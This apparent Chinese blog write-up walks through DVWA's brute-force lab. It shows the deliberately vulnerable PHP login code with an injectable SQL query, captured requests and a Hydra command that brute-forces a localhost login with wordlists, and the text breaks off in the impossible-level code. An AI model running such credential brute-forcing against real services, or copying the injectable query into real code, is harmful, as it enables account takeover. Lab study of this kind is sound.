    <content type="html"><![CDATA[<blockquote><p>弱口令安全问题估计从有密码登录那天估计就产生了。一般大家都不会搞太难的，实在记不住，甚至存在图省事，多个账户用一样的密码的&gt; 情况。后来的手机验证算是解放了很多人在“密码是什么来着”的困扰。所以这就给了违法犯罪分子的机会。“爆破”—-“炸开登录这道门”，换句话说就是试常见弱口令，看看有没有匹配的。</p></blockquote><h1 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h1><p>常规！普通的 <code>username</code>和 <code>password</code><br><img src="/2022/06/03/dvwa-brute-force/1691755389332.png" alt="1691755389332"></p><h1 id="响应页面"><a href="#响应页面" class="headerlink" title="响应页面"></a>响应页面</h1><p>这里输入为空，直接点 <code>Login</code></p><p><img src="/2022/06/03/dvwa-brute-force/1691759083929.png" alt="1691759083929"></p><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="发起请求"><a href="#发起请求" class="headerlink" title="发起请求"></a>发起请求</h2><p>输入为空的请求头如下，简单的 <code>GET</code> 请求中可见明文参数 <code>username</code>,<code>password</code>，<code>Login</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/vulnerabilities/brute/?username=&amp;password=&amp;Login=Login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:4280<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:4280/vulnerabilities/brute/?username=admin&amp;password=password&amp;Login=Login<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>security=low; PHPSESSID=ee0770a57f4479ba69fd13aeae15ed72<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br></code></pre></td></tr></table></figure><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><code>$query</code>中看到并没有过滤输入，怀疑可能存在SQL注入，估计用sqlmap注入也可以。能看到密码并不是明文存储的，是 <code>md5()</code>哈希值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get username</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br><br>    <span class="hljs-comment">// Get password</span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );<br><br>    <span class="hljs-comment">// Check the database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>        <span class="hljs-comment">// Get users details</span><br>        <span class="hljs-variable">$row</span>    = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> );<br>        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>实现密码爆破攻击方式多种多样，可以编写Python脚本，也可以使用其他工具，如 <code>Hydra</code>,<code>BurpSuite</code>。爆破字典可以从kali中 <code>/usr/share/wordlists/</code>子目录中自行选择。这里采用 <code>Hydra</code>,爆破速度很快，值得注意的是，HTTP请求头是需要带上cookie。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">hydra -L http_default_users.txt -P http_default_pass.txt -s 4280 localhost http-get-form <span class="hljs-string">&quot;/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:H=Cookie\: security=low; PHPSESSID=ee0770a57f4479ba69fd13aeae15ed72:F=Username and/or password incorrect&quot;</span></span> <br><br></code></pre></td></tr></table></figure><h2 id="爆破结果"><a href="#爆破结果" class="headerlink" title="爆破结果"></a>爆破结果</h2><p>当当当当！得到 <code>admin:password</code>弱口令<br><img src="/2022/06/03/dvwa-brute-force/1691759998970.png" alt="1691759998970"></p><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="发起请求-1"><a href="#发起请求-1" class="headerlink" title="发起请求"></a>发起请求</h2><p>同上</p><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p>相比low级别,medium级别对输入进行了简单的过滤， <code>mysqli_real_escape_string()</code>转义了特殊字符（会被进行转义的字符包括：NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Sanitise username input</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br>    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitise password input</span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );<br><br>    <span class="hljs-comment">// Check the database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>        <span class="hljs-comment">// Get users details</span><br>        <span class="hljs-variable">$row</span>    = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> );<br>        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-title function_ invoke__">sleep</span>( <span class="hljs-number">2</span> );<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2><p>同上</p><h2 id="爆破结果-1"><a href="#爆破结果-1" class="headerlink" title="爆破结果"></a>爆破结果</h2><p>同上</p><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="发起请求-2"><a href="#发起请求-2" class="headerlink" title="发起请求"></a>发起请求</h2><p>可以看到，GET请求中增加了 <code>user_token</code>参数，该参数是CSRF的老朋友了。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/vulnerabilities/brute/?username=admin&amp;password=password&amp;Login=Login&amp;user_token=863485e53e9b2a1721fc4ea0b6d6ab21</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:4280<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:4280/vulnerabilities/brute/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>security=high; PHPSESSID=ee0770a57f4479ba69fd13aeae15ed72<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br></code></pre></td></tr></table></figure><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><p>相比medium,增加了<strong>CSRF token</strong>的使用,像 <code>checkToken()</code>,<code>generateSessionToken()</code>。<code>token</code>一般用在页面可发起请求的标签，确认请求不是来自CSRF。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Sanitise username input</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$user</span> );<br>    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitise password input</span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );<br><br>    <span class="hljs-comment">// Check database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>        <span class="hljs-comment">// Get users details</span><br>        <span class="hljs-variable">$row</span>    = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> );<br>        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-title function_ invoke__">sleep</span>( <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h2><p>由于页面采用了CSRF token,之前的 <code>Hydra</code>不能满足需求，可以使用脚本或者 <code>BurpSuite</code>(需要自动获取CSRF token,<a href="https://blog.csdn.net/slslslyxz/article/details/111302778">参考链接</a>)，图略……Burp用的临时项目关闭了这些设置就没了……</p><h2 id="爆破结果-2"><a href="#爆破结果-2" class="headerlink" title="爆破结果"></a>爆破结果</h2><p>可以在<strong>不同字节大小</strong>响应中判断出哪对口令和密码是正确的。图略……欢迎探索</p><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>学习时间到！！！<br>可以看到用到了 <code>输入过滤</code>，<code>Anti-CSRF Token</code>,<code>SQL预编译</code>以及 <code>失败锁定</code>，多管齐下保安全！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) ) &#123;<br>    <span class="hljs-comment">// Check 